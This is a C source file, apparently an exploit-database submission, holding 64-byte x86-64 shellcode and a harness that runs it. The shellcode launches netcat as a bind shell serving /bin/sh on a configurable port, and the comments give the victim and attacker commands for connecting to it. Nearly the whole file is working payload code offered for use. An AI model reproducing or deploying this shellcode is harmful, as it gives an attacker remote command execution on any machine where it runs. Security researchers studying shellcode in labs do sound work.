#include <stdio.h>
#include <string.h>

// Exploit Title: [NetCat Bind Shell 64bit 64byte]
// Date: [6/28/2016]
// Exploit Author: [CripSlick]
// Tested on: [Kali 2.0]
// Version: [v1.10-41]

// ShepherdDowling@gmail.com
// OffSec ID: OS-20614

// Victim: netstat -an | grep LISTEN | grep tcp
// Attacker: nc <victim_IP> <port>

unsigned char code[] = \

#define PORT "\x39\x39"
// Keep to two bytes

"\x48\x31\xff\x48\xf7\xe7\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x6e\x63\x57\x48\x89\xe7\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe3\x68\x2d\x6c\x76\x65\x48\x89\xe1\x68\x2d\x70"PORT"\x48\x89\xe6\x50\x53\x51\x56\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
;

int main ()
{
    // I make sure there are no nulls
    // The string count will terminate at the first \x00
    printf("The Shellcode is %d Bytes Long\n", strlen(code));

    // Next I throw 0xAAAAAAAA into every register before shellcode execution
    // This ensures that the shellcode will run in any circumstance

	__asm__("mov $0xAAAAAAAAAAAAAAAA, %rax\n\t"
		"mov %rax, %rbx\n\t" "mov %rax, %rcx\n\t" "mov %rax, %rdx\n\t"
		"mov %rax, %rsi\n\t" "mov %rax, %rdi\n\t" "mov %rax, %rbp\n\t"
		"mov %rax, %r10\n\t" "mov %rax, %r11\n\t" "mov %rax, %r12\n\t"
		"mov %rax, %r13\n\t" "mov %rax, %r14\n\t" "mov %rax, %r15\n\t"
		"call code");
	return 0;
}